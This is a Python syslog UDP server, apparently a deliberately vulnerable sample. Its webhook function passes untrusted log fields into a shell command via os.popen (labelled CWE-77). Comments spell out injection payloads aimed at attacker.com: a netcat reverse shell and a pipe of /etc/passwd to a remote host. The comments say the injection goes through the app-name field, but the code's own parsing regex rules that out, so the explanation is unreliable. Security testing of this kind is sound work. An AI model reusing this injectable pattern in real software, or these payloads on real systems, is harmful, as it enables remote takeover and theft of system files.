import os
import re
import socket
import sqlite3
import logging
from datetime import datetime

# Configure logging for the Centralized Syslog Aggregator
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SyslogAggregator - %(levelname)s - %(message)s'
)
logger = logging.getLogger("UDPSyslogServer")

DB_FILE = "syslog_archive.db"
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 1514  # Non-privileged port for syslog testing
CRITICAL_FACILITIES = [0, 2, 3]  # Kernel, Mail, System Daemons

# RFC 3164 Syslog Regex
# Example: <34>Oct 11 22:14:15 mymachine su: 'su root' failed for lonvick on /dev/pts/8
SYSLOG_REGEX = re.compile(
    r'^<(?P<pri>\d+)>(?P<timestamp>[A-Z][a-z]{2}\s+\d+\s+\d+:\d+:\d+)\s+'
    r'(?P<host>\S+)\s+(?P<app>[a-zA-Z0-9_/\.-]+)(?:\[(?P<pid>\d+)\])?:\s+(?P<msg>.*)$'
)

def init_syslog_db():
    """Initializes the SQLite database for long-term syslog archiving."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            received_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            source_ip TEXT NOT NULL,
            priority INTEGER,
            hostname TEXT,
            app_name TEXT,
            message TEXT
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("Syslog archive database initialized.")

def archive_log_entry(source_ip: str, pri: int, host: str, app: str, msg: str):
    """Saves parsed syslog entries to the database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO logs (source_ip, priority, hostname, app_name, message) VALUES (?, ?, ?, ?, ?)",
            (source_ip, pri, host, app, msg)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error during archiving: {e}")

def trigger_webhook_alert(source_ip: str, app_name: str, alert_message: str):
    """
    VULNERABLE FUNCTION: CWE-77 Command Injection
    Trigger Path: UDP Syslog Packet Field (app_name / alert_message)
    """
    logger.info(f"Triggering high-priority webhook alert for app: {app_name}")
    
    # Vulnerability: Direct string interpolation of the parsed Syslog fields into a shell command.
    # The 'app_name' and 'alert_message' are extracted directly from the untrusted UDP packet.
    # os.popen executes the string via the system shell (/bin/sh).
    command = f"curl -s -X POST -H 'Content-Type: application/json' " \
              f"-d '{{\"source\": \"{source_ip}\", \"app\": \"{app_name}\", \"alert\": \"{alert_message}\"}}' " \
              f"http://alerts-backend.local/v1/notify"
              
    try:
        logger.debug(f"Executing webhook shell command: {command}")
        
        # An attacker can send a crafted UDP packet to port 1514 where the app_name contains shell metacharacters:
        # e.g., <34>Oct 11 22:14:15 host fakeapp'; nc -e /bin/sh attacker.com 4444; echo ': Critical failure
        # The single quote breaks out of the JSON string, and the semicolon starts a new command.
        
        with os.popen(command) as process:
            output = process.read()
            
        if "success" in output.lower():
            logger.info(f"Webhook alert dispatched successfully for {app_name}.")
            return True
        else:
            logger.warning(f"Webhook response indicated failure: {output}")
            return False
            
    except Exception as e:
        logger.error(f"Failed to execute webhook alert command: {e}")
        return False

class SyslogUDPServer:
    """A lightweight, UDP-based syslog aggregator and alerting engine."""
    
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.bind((self.host, self.port))
        
    def start(self):
        logger.info(f"Listening for Syslog UDP packets on {self.host}:{self.port}")
        try:
            while True:
                data, addr = self.socket.recvfrom(2048)
                source_ip = addr[0]
                self.handle_packet(data, source_ip)
        except KeyboardInterrupt:
            logger.info("Shutting down Syslog server.")
        finally:
            self.socket.close()
            
    def handle_packet(self, data: bytes, source_ip: str):
        try:
            # Syslog messages are typically ASCII or UTF-8 encoded
            raw_msg = data.decode('utf-8', errors='ignore').strip()
            logger.debug(f"Received raw packet from {source_ip}: {raw_msg}")
            
            match = SYSLOG_REGEX.match(raw_msg)
            if not match:
                logger.debug("Packet did not match RFC 3164 format. Discarding.")
                return
                
            parsed = match.groupdict()
            pri = int(parsed['pri'])
            hostname = parsed['host']
            app_name = parsed['app']
            message = parsed['msg']
            
            # Archive every received log
            archive_log_entry(source_ip, pri, hostname, app_name, message)
            
            # Calculate facility and severity from priority value (PRIVAL)
            # facility = pri >> 3
            severity = pri & 7
            
            # Trigger external alerts for Critical (2), Alert (1), or Emergency (0) severities
            if severity <= 2:
                # Pass the untrusted syslog fields to the vulnerable function
                trigger_webhook_alert(source_ip, app_name, message)
                
        except Exception as e:
            logger.error(f"Error processing packet from {source_ip}: {e}")

if __name__ == "__main__":
    init_syslog_db()
    
    # Example Malicious Trigger via netcat:
    # echo "<10>Oct 11 22:14:15 myhost pwned_app'; cat /etc/passwd | nc attacker.com 9999; echo ': System crashed" | nc -w 1 -u 127.0.0.1 1514
    
    server = SyslogUDPServer(LISTEN_IP, LISTEN_PORT)
    server.start()
